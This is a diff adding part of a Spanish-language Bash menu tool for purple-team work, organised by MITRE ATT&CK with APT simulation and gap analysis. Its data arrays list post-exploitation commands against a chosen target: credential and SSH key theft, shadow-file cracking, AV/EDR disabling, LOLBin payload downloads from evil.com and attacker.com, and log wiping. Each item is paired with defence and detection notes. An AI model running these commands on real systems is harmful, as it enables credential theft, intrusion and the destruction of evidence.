+        echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS${NC}            ${RED}║${NC}"
+        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo "1. T1003     — OS Credential Dumping (Mimikatz/secretsdump)"
+        echo "2. T1555     — Credentials from Password Stores (DPAPI/browsers)"
+        echo "3. T1558.003 — Kerberoasting (Rubeus/impacket)"
+        echo "4. T1550.003 — Pass-the-Ticket (PtT)"
+        echo "5. T1082     — System Information Discovery"
+        echo "6. T1018     — Remote System Discovery (BloodHound)"
+        echo "7. Volver"
+        echo ""
+        read -p "💣 Selecciona [1-7]: " op
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${WIN_DATA[1]}" "T1003 — OS Credential Dumping" ;;
+                2) _show_post_exploitation "${WIN_DATA[2]}" "T1555 — Credentials from Password Stores" ;;
+                3) _show_post_exploitation "${WIN_DATA[3]}" "T1558.003 — Kerberoasting" ;;
+                4) _show_post_exploitation "${WIN_DATA[4]}" "T1550.003 — Pass-the-Ticket (PtT)" ;;
+                5) _show_post_exploitation "${WIN_DATA[5]}" "T1082 — System Information Discovery" ;;
+                6) _show_post_exploitation "${WIN_DATA[6]}" "T1018 — Remote System Discovery (BloodHound)" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
+        echo ""
+        read -p "↵ Enter para continuar..." _
+    done
+}
+
+declare -A LINUX_DATA
+LINUX_DATA[1]="🔴 ATAQUE:
+  • ssh root@TARGET \"cat ~/.bash_history\"
+  • ssh root@TARGET \"grep -i 'pass\|secret\|key\|token\|aws\|api' ~/.bash_history\"
+  • ssh root@TARGET \"find / -name '.bash_history' 2>/dev/null | xargs grep -l 'pass'\"
+  • ssh root@TARGET \"history | grep -i 'mysql\|psql\|ssh.*@\|curl.*-u'\"
+|||
+🔵 DEFENSA:  HISTCONTROL=ignorespace | HISTFILE=/dev/null
+|||
+🟣 DETECCIÓN:  auditd regla: -a always,exit -F path=~/.bash_history"
+
+LINUX_DATA[2]="🔴 ATAQUE:
+  • ssh root@TARGET \"grep -rn 'password\|passwd\|secret\|token' /etc/ 2>/dev/null\"
+  • ssh root@TARGET \"find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null\"
+  • ssh root@TARGET \"cat /etc/mysql/debian.cnf\"
+  • ssh root@TARGET \"find / -name '*.conf' -exec grep -l 'password' {} \\;\"
+|||
+🔵 DEFENSA:  Vault/secrets manager, permisos 600 en config files
+|||
+🟣 DETECCIÓN:  inotifywait en archivos sensibles, auditd"
+
+LINUX_DATA[3]="🔴 ATAQUE:
+  • ssh root@TARGET \"find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null\"
+  • scp root@TARGET:~/.ssh/id_rsa ./id_rsa_TARGET
+  • ssh root@TARGET \"cat ~/.ssh/authorized_keys\"
+  • ssh-keygen -y -f ./id_rsa_TARGET  (extraer clave pública para verificar)
+|||
+🔵 DEFENSA:  SSH keys protegidas con passphrase + ssh-agent
+|||
+🟣 DETECCIÓN:  auditd: acceso a archivos .ssh/ fuera del owner"
+
+LINUX_DATA[4]="🔴 ATAQUE:
+  • ssh user@TARGET \"sudo -l\"
+  • ssh root@TARGET \"cat /etc/sudoers\"
+  • ssh user@TARGET \"sudo -u root /bin/bash\"
+  • ssh user@TARGET \"pt-copy-sudo-token [PID_of_sudo_session]\"
+|||
+🔵 DEFENSA:  timestamp_timeout=0 en sudoers, PAM lockout
+|||
+🟣 DETECCIÓN:  Event sudo: nuevas sesiones con usuario diferente"
+
+LINUX_DATA[5]="🔴 ATAQUE:
+  • scp root@TARGET:/etc/passwd ./passwd_TARGET
+  • scp root@TARGET:/etc/shadow ./shadow_TARGET
+  • unshadow passwd_TARGET shadow_TARGET > combined_TARGET.txt
+  • john --wordlist=rockyou.txt combined_TARGET.txt
+  • hashcat -m 1800 combined_TARGET.txt rockyou.txt
+|||
+🔵 DEFENSA:  PAM: lock after 5 fails, shadow perms 640
+|||
+🟣 DETECCIÓN:  auditd: -w /etc/shadow -p rwa"
+
+LINUX_DATA[6]="🔴 ATAQUE:
+  • ssh root@TARGET \"find / -perm -4000 2>/dev/null\"
+  • ssh root@TARGET \"find / -writable -type f 2>/dev/null | grep -v proc\"
+  • ssh root@TARGET \"ls -la /home/*/.ssh/\"
+  • ssh root@TARGET \"find /var/www -name '*.php' | xargs grep 'password'\"
+  • ssh root@TARGET \"ls /opt /srv /data /backup 2>/dev/null\"
+|||
+🔵 DEFENSA:  Auditoría de SUID binaries, permisos mínimos
+|||
+🟣 DETECCIÓN:  auditd: find y locate agresivos en filesystem"
+
+post_explotacion_linux() {
+    while true; do
+        show_banner
+        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${RED}║       ${YELLOW}🐧 POST-EXPLOTACIÓN — LINUX${NC}              ${RED}║${NC}"
+        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo "1. T1552.003 — Credentials in Bash History"
+        echo "2. T1552.002 — Credentials in Files (config files)"
+        echo "3. T1552.004 — Private SSH Keys"
+        echo "4. T1548.003 — Sudo Token Impersonation"
+        echo "5. T1003.008 — /etc/passwd y /etc/shadow"
+        echo "6. T1083 — Enumeración de directories sensibles"
+        echo "7. Volver"
+        echo ""
+        read -p "💣 Selecciona [1-7]: " op
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${LINUX_DATA[1]}" "T1552.003 — Bash History" ;;
+                2) _show_post_exploitation "${LINUX_DATA[2]}" "T1552.002 — Credentials in Files" ;;
+                3) _show_post_exploitation "${LINUX_DATA[3]}" "T1552.004 — Private SSH Keys" ;;
+                4) _show_post_exploitation "${LINUX_DATA[4]}" "T1548.003 — Sudo Token Impersonation" ;;
+                5) _show_post_exploitation "${LINUX_DATA[5]}" "T1003.008 — /etc/passwd & /etc/shadow" ;;
+                6) _show_post_exploitation "${LINUX_DATA[6]}" "T1083 — File & Directory Discovery" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
+        echo ""
+        read -p "↵ Enter para continuar..." _
+    done
+}
+
+declare -A EVASION_DATA
+EVASION_DATA[1]="🔴 TÉCNICAS en Windows TARGET:
+  • psexec.py user:pass@TARGET \"powershell -enc [base64_payload]\"
+  • wmiexec.py user:pass@TARGET \"powershell -ep bypass -c Invoke-Obfuscation Token\\All\\1\"
+  • evil-winrm -i TARGET -u Admin -p Pass -s obfuscated_script.ps1
+  • String concatenation: \$c='I'+'EX'; &(\$c) payload_for_TARGET
+  • Chameleon PowerShell: generar script camuflado y usar en TARGET
+|||
+🔵 DETECCIÓN en TARGET:
+  • PowerShell Script Block Logging (Event 4104) → decodifica el payload en Event Viewer de TARGET
+  • AMSI: intercepta antes de ejecutar incluso código decodificado
+  • Buscar -enc, IEX, DownloadString, base64 en logs de PowerShell"
+
+EVASION_DATA[2]="🔴 TÉCNICAS en TARGET:
+  • Psexec / Meterpreter a TARGET → meterpreter> execute -f svchost.exe -a '-k netsvcs' -H
+  • Shellcode: inyectar payload.bin en memoria vía CreateRemoteThread en proceso de TARGET
+  • Process Hollowing: SpawnProcess en Winlogon en TARGET suspendido → Replace code
+  • Reflective DLL: meterpreter> load incognito (o cargar DLL directo en memoria de TARGET sin disco)
+  • wmic /node:TARGET process call create \"C:\\payload_injector.exe\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Sysmon Event 8: CreateRemoteThread
+  • Sysmon Event 25: ProcessTampering (Process Hollowing)
+  • Memoria RWX en proceso legítimo sin mapear a fichero
+  • EDR: comportamiento anómalo en proceso → código en heap"
+
+EVASION_DATA[3]="🔴 TÉCNICAS en TARGET:
+  • psexec.py admin:pass@TARGET \"powershell Set-MpPreference -DisableRealtimeMonitoring \$true\"
+  • wmiexec.py admin:pass@TARGET \"sc stop WinDefend && sc config WinDefend start=disabled\"
+  • evil-winrm -i TARGET -u admin -p pass → BYOVD: traer driver vulnerable para kill EDR desde kernel
+  • wmic /node:TARGET path MSFT_MpPreference call Add ExclusionPath='C:\\temp'
+  • psexec.py admin@TARGET \"taskkill /F /IM MsMpEng.exe\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Tamper Protection (Microsoft Defender) → bloquea cambios
+  • Event ID 7036: servicio WinDefend detenido → alerta inmediata
+  • EDR heartbeat: si el agente en TARGET deja de reportar → alerta
+  • Alertar drivers cargados no firmados por Microsoft"
+
+EVASION_DATA[4]="🔴 LOLBINS descargados/ejecutados en TARGET:
+  • certutil.exe en TARGET:
+    wmic /node:TARGET process call create \"certutil -urlcache -split -f http://evil.com/sh.exe C:\\temp\\sh.exe\"
+  • mshta.exe en TARGET:
+    psexec.py admin@TARGET \"mshta.exe http://attacker.com/payload.hta\"
+  • regsvr32.exe CargarDLL/COM sin previo registro en TARGET:
+    evil-winrm -i TARGET → regsvr32 /s /u /i:http://attacker.com/pay.sct scrobj.dll
+  • msiexec.exe: instalar MSI remoto: msiexec /q /i http://evil.com/TARGET_payload.msi
+|||
+🔵 DETECCIÓN en TARGET:
+  • WDAC / AppLocker: bloquear certutil para descargas
+  • Alertar en: certutil -urlcache, mshta con URL, regsvr32 /i:http
+  • Sysmon ID 1: argumento de red en procesos 'legítimos'"
+
+EVASION_DATA[5]="🔴 TÉCNICAS de borrado en TARGET:
+  • psexec.py admin@TARGET \"wevtutil cl Security; wevtutil cl System; wevtutil cl Application\"
+  • evil-winrm -i TARGET → Clear-EventLog -LogName Security,System
+  • ssh root@TARGET \"> /var/log/auth.log; history -c; shred -u ~/.bash_history\"
+  • wmic /node:TARGET process call create \"sc stop Sysmon\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Event ID 1102: Audit log cleared → alerta inmediata enviada a SIEM
+  • Event ID 7036: Sysmon detenido en TARGET
+  • SIEM externo: si TARGET deja de recibir logs del host → alerta inmediata
+  • WORM logs: escribir en repositorio externo inmutable"
+
+EVASION_DATA[6]="🔴 TÉCNICAS en TARGET:
+  • Renombrar malware como svchost.exe y transferir a TARGET
+  • smbclient //TARGET/C$ → Poner malware en C:\\Windows\\System32\\svchost.exe
+  • Unicode homoglifos: invocar svсhost.exe en TARGET (с cirílico vs c latino)
+  • DLL Side-Loading: colocar DLL maliciosa junto a app legítima en TARGET
+|||
+🔵 DETECCIÓN en TARGET:
+  • Verificar firma digital de todos los ejecutables en System32
+  • Sysmon ID 1: path de proceso vs. path esperado del ejecutable
+  • Alertar en: procesos que se llaman svchost.exe fuera de System32 en TARGET"
+
+evasion_defensas() {
+    while true; do
+        show_banner
+        echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${YELLOW}║        ${RED}🕵️  EVASIÓN DE DEFENSAS${NC}                  ${YELLOW}║${NC}"
+        echo -e "${YELLOW}║     ${CYAN}Defense Evasion — TA0005 MITRE${NC}            ${YELLOW}║${NC}"
+        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo "1. T1027.010 — Ofuscación de comandos (PowerShell)"
+        echo "2. T1055     — Process Injection (DLL / Shellcode)"
+        echo "3. T1562.001 — Deshabilitar AV/EDR"
+        echo "4. T1218     — LoLBins (Living Off The Land Binaries)"
+        echo "5. T1070.004 — Indicador Removal: Borrar Logs"
+        echo "6. T1036     — Masquerading (Suplantación de procesos)"
+        echo "7. Volver"
+        echo ""
+        read -p "🕵️  Selecciona [1-7]: " op
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${EVASION_DATA[1]}" "T1027.010 — Ofuscación de PowerShell" ;;
+                2) _show_post_exploitation "${EVASION_DATA[2]}" "T1055 — Process Injection" ;;
+                3) _show_post_exploitation "${EVASION_DATA[3]}" "T1562.001 — Disable AV/EDR" ;;
+                4) _show_post_exploitation "${EVASION_DATA[4]}" "T1218 — Living Off The Land Binaries" ;;
+                5) _show_post_exploitation "${EVASION_DATA[5]}" "T1070.004 — Indicator Removal: Log Wipe" ;;
+                6) _show_post_exploitation "${EVASION_DATA[6]}" "T1036 — Masquerading" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
+        echo ""
+        read -p "↵ Enter para continuar..." _
+    done
+}
+
+menu_post_explotacion() {
+    preguntar_objetivo || return
+    while true; do
+        show_banner
+        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${RED}║           ${YELLOW}💣 MENÚ POST-EXPLOTACIÓN${NC}             ${RED}║${NC}"
+        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "  ${YELLOW}1.${NC} Post-Explotación Windows (Mimikatz, Kerberoasting...)"
+        echo -e "  ${YELLOW}2.${NC} Post-Explotación Linux (Bash history, SSH keys...)"
+        echo -e "  ${YELLOW}3.${NC} Evasión de Defensas (LoLBins, Obfuscation, AV Bypass)"
+        echo -e "  ${RED}0.${NC} Volver"
+        echo ""
+        read -p "💣 Selecciona [0-3]: " op
+        case $op in
+            1) post_explotacion_windows ;;
+            2) post_explotacion_linux ;;
+            3) evasion_defensas ;;
+            0) return ;;
+            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+        esac
+    done
+}
+
+# ============================================================
+# 12. SIMULACIÓN DE ACTORES DE AMENAZA (APT)
+# ============================================================
+simular_apt() {
+    preguntar_objetivo || return
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║      ${RED}🕵️  SIMULACIÓN DE ACTOR DE AMENAZA${NC}          ${CYAN}║${NC}"
+        echo -e "${CYAN}║       ${YELLOW}APT29 · APT38 · FIN7 · Personalizado${NC}     ${CYAN}║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "  ${YELLOW}1.${NC} ${RED}APT29${NC} (Cozy Bear) 🇷🇺  — Espionaje SVR Ruso"
+        echo -e "  ${YELLOW}2.${NC} ${RED}APT38${NC} (Lazarus)   🇰🇵 — Financiero RPDC"
+        echo -e "  ${YELLOW}3.${NC} ${RED}FIN7${NC}  (Carbanak)   💰  — Criminal Financiero"
+        echo -e "  ${YELLOW}4.${NC} ${BLUE}Personalizado${NC}       🎯  — Define tus técnicas"
+        echo -e "  ${RED}0.${NC} Volver"
+        echo ""
+        read -p "🕵️  Selecciona APT [0-4]: " sel
+
+        case $sel in
+            1) _show_apt "APT29" ;;
+            2) _show_apt "APT38" ;;
+            3) _show_apt "FIN7" ;;
+            4) _apt_personalizado ;;
+            0) return ;;
+            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+        esac
+        echo ""
+        read -p "↵ Enter para continuar..." _
+    done
+}
+
+_show_apt() {
+    local apt="$1"
+    local info="${APT_INFO[$apt]}"
+    local tecnicas="${APT_TECNICAS[$apt]}"
+    local aperturndata="${APT_DATA[$apt]}"
+
+    echo ""
+    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║  ${CYAN}🕵️  PERFIL: $apt contra ${TARGET}${NC}"
+    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
+    echo ""
+    IFS='|' read -ra info_parts <<< "$info"
+    echo -e "  ${YELLOW}Alias:${NC}       ${info_parts[0]}"
+    echo -e "  ${YELLOW}Atribución:${NC}  ${info_parts[1]}"
+    echo -e "  ${YELLOW}Motivación:${NC}  ${info_parts[2]}"
+    echo -e "  ${YELLOW}Objetivo:${NC}    ${info_parts[3]}"
+    echo ""
+    echo -e "${PURPLE}══ KILL CHAIN ════════════════════════════════════${NC}"
+    
+    local parsed_text="${aperturndata//TARGET/$TARGET}"
+
+    local temp="$parsed_text"
+    local delimiter="|||"
+    local pasos=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        pasos+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    pasos+=("$temp")
+
+    for paso in "${pasos[@]}"; do
+        paso="$(echo -e "$paso" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$paso" ]] && continue
+        
+        # Resaltamos el primer título (la técnica MITRE)
+        local tecnica=$(echo "$paso" | head -n 1)
+        local rest=$(echo "$paso" | tail -n +2)
+        
+        echo -e "  ${GREEN}➤${NC} ${CYAN}$tecnica${NC}"
+        if [[ -n "$rest" ]]; then
+            echo -e "$rest" | sed 's/^/      /'
+        fi
+        echo ""
+    done
+    echo -e "${CYAN}══ TÉCNICAS MITRE ATT&CK ════════════════════════${NC}"
+    IFS='|' read -ra tecs <<< "$tecnicas"
+    for tec in "${tecs[@]}"; do
+        local tid="${tec%%:*}"
+        local tnom="${tec##*:}"
+        printf "  ${YELLOW}%-14s${NC} %s\n" "$tid" "$tnom"
+    done
+    echo ""
+    echo -e "${YELLOW}══ EVALUACIÓN DE COBERTURA ══════════════════════${NC}"
+    echo -e "  ¿Tienes defensa contra estas técnicas?"
+    echo ""
+    IFS='|' read -ra tecs2 <<< "$tecnicas"
+    local cubierto=0
+    local total=${#tecs2[@]}
+    for tec in "${tecs2[@]}"; do
+        local tid="${tec%%:*}"
+        read -p "  ¿Detectarías/mitigarías ${CYAN}$tid${NC}? [s/n]: " resp
+        if [[ "${resp,,}" == "s" ]]; then
+            echo -e "    ${GREEN}✅ Cubierta${NC}"
+            ((cubierto++))
+        else
+            echo -e "    ${RED}❌ BRECHA detectada → revisar controles${NC}"
+        fi
+    done
+    echo ""
+    local pct=$(( cubierto * 100 / total ))
+    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
+    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total técnicas (${YELLOW}$pct%${NC})"
+    if (( pct >= 70 )); then
+        echo -e "  ${GREEN}✅ Postura defensiva BUENA frente a $apt${NC}"
+    elif (( pct >= 40 )); then
+        echo -e "  ${YELLOW}⚠️  Postura MEJORABLE — brechas significativas${NC}"
+    else
+        echo -e "  ${RED}🚨 Postura CRÍTICA — expuesto a $apt${NC}"
+    fi
+    save_output "[$apt SIMULACION] Cobertura: $cubierto/$total ($pct%)"
+}
+
+_apt_personalizado() {
+    echo ""
+    echo -e "${BLUE}╔══ APT PERSONALIZADO ═══════════════════════════╗${NC}"
+    echo -e "  Ingresa los IDs de técnicas MITRE separadas por coma"
+    echo -e "  Ejemplo: ${YELLOW}T1566,T1059,T1078,T1003${NC}"
+    echo ""
+    read -p "🎯 Tus técnicas: " custom_input
+
+    IFS=',' read -ra custom_tecs <<< "$custom_input"
+    local cubierto=0
+    local total=${#custom_tecs[@]}
+
+    echo ""
+    echo -e "${YELLOW}══ EVALUACIÓN PERSONALIZADA ══════════════════════${NC}"
+    for tid in "${custom_tecs[@]}"; do
+        tid="${tid// /}"
+        local pdata="${PURPLE_DATA[${tid^^}]}"
+        echo ""
+        echo -e "  ${CYAN}Técnica: ${tid^^}${NC}"
+        if [[ -n "$pdata" ]]; then
+            # Mostrar solo línea de ataque
+            local pmod="${pdata//TARGET/$TARGET}"
+            
+            local temp="$pmod"
+            local delimiter="|||"
+            local secciones=()
+            while [[ "$temp" == *"$delimiter"* ]]; do
+                secciones+=("${temp%%"$delimiter"*}")
+                temp="${temp#*"$delimiter"}"
+            done
+            secciones+=("$temp")
+            
+            for s in "${secciones[@]}"; do
+                if [[ "$s" == *"🔴"* ]]; then
+                    echo "$s" | head -5 | sed 's/^/  /'
+                    break
+                fi
+            done
+        fi
+        read -p "  ¿Detectarías/mitigarías esta técnica? [s/n]: " resp
+        if [[ "${resp,,}" == "s" ]]; then
+            echo -e "    ${GREEN}✅ Cubierta${NC}"
+            ((cubierto++))
+        else
+            echo -e "    ${RED}❌ BRECHA — revisa controles${NC}"
+        fi
+    done
+
+    echo ""
+    local pct=0
+    (( total > 0 )) && pct=$(( cubierto * 100 / total ))
+    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
+    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total (${YELLOW}$pct%${NC})"
+    save_output "[APT_CUSTOM] Cobertura: $cubierto/$total ($pct%)"
+}
+
+# ============================================================
+# 13. GAP ANALYSIS — HEAT MAP MITRE ATT&CK
+# ============================================================
+analizar_brechas() {
+    preguntar_objetivo || return
+    show_banner
+    echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║      ${CYAN}📈 GAP ANALYSIS — HEAT MAP MITRE${NC}           ${GREEN}║${NC}"
+    echo -e "${GREEN}║  ${YELLOW}✅ Probada+Mitigada  🟡 Sin mitigar  ❌ No probada${NC} ${GREEN}║${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -e "${CYAN}🎯 Evaluando postura contra: ${TARGET}${NC}"
+    echo -e "${YELLOW}Ingresa técnicas probadas separadas por coma${NC}"
+    echo -e "${BLUE}Ejemplo: T1566,T1059,T1003,T1078${NC}"
+    echo ""
+    read -p "✅ Técnicas probadas Y mitigadas: " input_verde
+    read -p "🟡 Técnicas probadas SIN mitigación: " input_amarillo
+    echo ""
+
+    # Normalizar inputs
+    declare -A probadas_verde
+    declare -A probadas_amarillo
+    IFS=',' read -ra v_arr <<< "$input_verde"
+    for t in "${v_arr[@]}"; do
+        t="${t// /}"
+        [[ -n "$t" ]] && probadas_verde["${t^^}"]=1
+    done
+    IFS=',' read -ra a_arr <<< "$input_amarillo"
+    for t in "${a_arr[@]}"; do
+        t="${t// /}"
+        [[ -n "$t" ]] && probadas_amarillo["${t^^}"]=1
+    done
+
+    # Definir técnicas representativas por táctica (4 por táctica)
+    declare -A HEAT_TECNICAS
+    HEAT_TECNICAS["TA0043"]="T1595 T1592 T1589 T1598"
+    HEAT_TECNICAS["TA0042"]="T1583 T1584 T1608 T1587"
+    HEAT_TECNICAS["TA0001"]="T1566 T1190 T1133 T1078"
+    HEAT_TECNICAS["TA0002"]="T1059 T1053 T1204 T1047"
+    HEAT_TECNICAS["TA0003"]="T1547 T1505 T1136 T1078"
+    HEAT_TECNICAS["TA0004"]="T1548 T1134 T1068 T1055"
+    HEAT_TECNICAS["TA0005"]="T1027 T1055 T1562 T1218"
+    HEAT_TECNICAS["TA0006"]="T1003 T1558 T1555 T1056"
+    HEAT_TECNICAS["TA0007"]="T1082 T1083 T1057 T1018"
+    HEAT_TECNICAS["TA0008"]="T1021 T1550 T1080 T1563"
+    HEAT_TECNICAS["TA0009"]="T1114 T1005 T1039 T1113"
+    HEAT_TECNICAS["TA0011"]="T1071 T1095 T1572 T1090"
+    HEAT_TECNICAS["TA0010"]="T1048 T1041 T1567 T1020"
+    HEAT_TECNICAS["TA0040"]="T1485 T1486 T1490 T1498"
+
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${YELLOW}       🗺️  HEAT MAP — MITRE ATT&CK Enterprise${NC}"
+    echo -e "${CYAN}             Objetivo: ${TARGET}${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+
+    local total_tecs=0
+    local total_verde=0
+    local total_amarillo=0
+
+    for tid in "${MITRE_ORDEN[@]}"; do
+        local tactica_short="${MITRE_TACTICAS[$tid]}"
+        # Primera parte antes del |
+        local emoji="${tactica_short%%|*}"
+        printf "  ${CYAN}%-40s${NC}" "$emoji"
+        local tecs="${HEAT_TECNICAS[$tid]}"
+        for tec in $tecs; do
+            ((total_tecs++))
+            if [[ "${probadas_verde[$tec]+_}" ]]; then
+                printf "${GREEN}✅%-7s${NC}" "$tec"
+                ((total_verde++))
+            elif [[ "${probadas_amarillo[$tec]+_}" ]]; then
+                printf "${YELLOW}🟡%-7s${NC}" "$tec"
+                ((total_amarillo++))
+            else
+                printf "${RED}❌%-7s${NC}" "$tec"
+            fi
+        done
+        echo ""
+    done
+
+    local total_cubierto=$(( total_verde + total_amarillo ))
+    local pct=0
+    (( total_tecs > 0 )) && pct=$(( total_cubierto * 100 / total_tecs ))
+
+    echo ""
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${GREEN}✅ Probadas+Mitigadas:${NC} $total_verde"
+    echo -e "  ${YELLOW}🟡 Probadas sin mitigación:${NC} $total_amarillo"
+    echo -e "  ${RED}❌ No probadas:${NC} $(( total_tecs - total_cubierto ))"
+    echo -e "  ${CYAN}📊 Cobertura total: ${YELLOW}$total_cubierto / $total_tecs (${pct}%)${NC}"
+    echo ""
+    if (( pct >= 60 )); then
+        echo -e "  ${GREEN}✅ Postura de seguridad BUENA${NC}"
+    elif (( pct >= 30 )); then
+        echo -e "  ${YELLOW}⚠️  Postura MEJORABLE — muchas técnicas sin cubrir${NC}"
+    else
+        echo -e "  ${RED}🚨 Postura CRÍTICA — revisar controles urgente${NC}"
+    fi
+    echo ""
+    read -p "💾 ¿Deseas guardar este análisis avanzado? (s/n): " resp_save
+    if [[ "${resp_save,,}" == "s" ]]; then
+        local gap_file="gap_analysis_${TARGET}_$(date +%s).txt"
+        {
+            echo "=================================================="
+            echo "  📈 GAP ANALYSIS — HEAT MAP MITRE"
+            echo "  Objetivo: $TARGET | Fecha: $(date)"
+            echo "=================================================="
+            echo "✅ Probadas mitigadas: $total_verde"
+            echo "🟡 Probadas sin mitigación: $total_amarillo"
+            echo "❌ No probadas: $(( total_tecs - total_cubierto ))"
+            echo "📊 Cobertura total: $total_cubierto / $total_tecs (${pct}%)"
+            echo "=================================================="
+        } > "$gap_file"
+        echo -e "${GREEN}✅ Análisis guardado exitosamente en: $gap_file${NC}"
+    fi
+    save_output "[GAP ANALYSIS] Cobertura: $total_cubierto/$total_tecs ($pct%)"
+    read -p "↵ Enter para continuar..." _
+}
+
+# ============================================================
+# MENÚ PRINCIPAL
+# ============================================================
+while true; do
+    show_banner
+
+    echo -e "${GREEN}🛡️  1. ${NC} Reconocimiento Básico"
+    echo -e "${GREEN}🌐  2. ${NC} Escaneo Web"
+    echo -e "${GREEN}📡  3. ${NC} Análisis de Red"
+    echo -e "${GREEN}⚔️   4. ${NC} Suite de Pentesting"
+    echo -e "${GREEN}📊  5. ${NC} Generar Reportes"
+    echo -e "${GREEN}🔧  6. ${NC} Herramientas Avanzadas"
+    echo -e "${CYAN}💬  7. ${NC} Chat Libre Técnico"
+    echo -e "${CYAN}🔍  8. ${NC} Escaneo Sigiloso"
+    echo -e "${PURPLE}━━━━━━━━━━━━━━ MODO EXPERTO ━━━━━━━━━━━━━━${NC}"
+    echo -e "${YELLOW}🎯  9. ${NC} Matriz MITRE ATT&CK ${CYAN}(14 tácticas)${NC}"
+    echo -e "${PURPLE}🟣 10. ${NC} Modo Purple Team ${RED}(Red${NC}+${BLUE}Blue${NC}+${PURPLE}Detect)${NC}"
+    echo -e "${RED}💣 11. ${NC} Post-Explotación ${YELLOW}(Win+Linux+Evasión)${NC}"
+    echo -e "${CYAN}🕵️  12. ${NC} Simulación de APT ${YELLOW}(APT29·APT38·FIN7)${NC}"
+    echo -e "${GREEN}📈 13. ${NC} Gap Analysis ${CYAN}/ Heat Map MITRE${NC}"
+    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${CYAN}🎯 Objetivo actual: ${TARGET:-No definido}${NC}"
+    echo -e "  ${BLUE}C.${NC}  Cambiar objetivo"
+    if [[ "$SAVE_MODE" == true ]]; then
+        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${GREEN}[ACTIVO → $OUTPUT_FILE]${NC}"
+    else
+        echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${RED}[INACTIVO]${NC}"
+    fi
+    echo -e "${RED}❌  0. ${NC} Salir"
+    echo ""
+
+    read -p "🎯 Selecciona opción [0-13, C, S]: " main_opcion
+
+    case $main_opcion in
+        1) reconocimiento_basico ;;
+        2) escaneo_web ;;
+        3) analisis_red ;;
+        4) suite_pentesting ;;
+        5) generar_reportes ;;
+        6) herramientas_avanzadas ;;
+        7) chat_libre ;;
+        8) escaneo_sigiloso ;;
+        9) mitre_menu ;;
+        10) modo_purple_team ;;
+        11) menu_post_explotacion ;;
+        12) simular_apt ;;
+        13) analizar_brechas ;;
+        [Cc]) preguntar_objetivo ;;
+        [Ss])
+            if [[ "$SAVE_MODE" == false ]]; then
+                SAVE_MODE=true
+                echo ""
+                echo -e "${GREEN}✅ Guardado ACTIVADO → ${OUTPUT_FILE}${NC}"
+            else
+                SAVE_MODE=false
+                echo ""
+                echo -e "${YELLOW}⏹️  Guardado DESACTIVADO${NC}"
+            fi
+            sleep 1
+            ;;
+        0)
+            TARGET=""
+            show_banner
+            echo ""
+            echo -e "${GREEN}            ¡HASTA PRONTO! ${NC}"
+            echo -e "${BLUE}    Gracias por usar HacXGPT v8.0 EXPERTO ${NC}"
+            echo -e "${PURPLE}       MITRE ATT&CK Framework Edition ${NC}"
+            echo ""
+            echo ""
+            exit 0
+            ;;
+        *)
+            echo ""
+            echo -e "${RED}❌ Opción no válida${NC}"
+            sleep 1
+            ;;
+    esac
+done
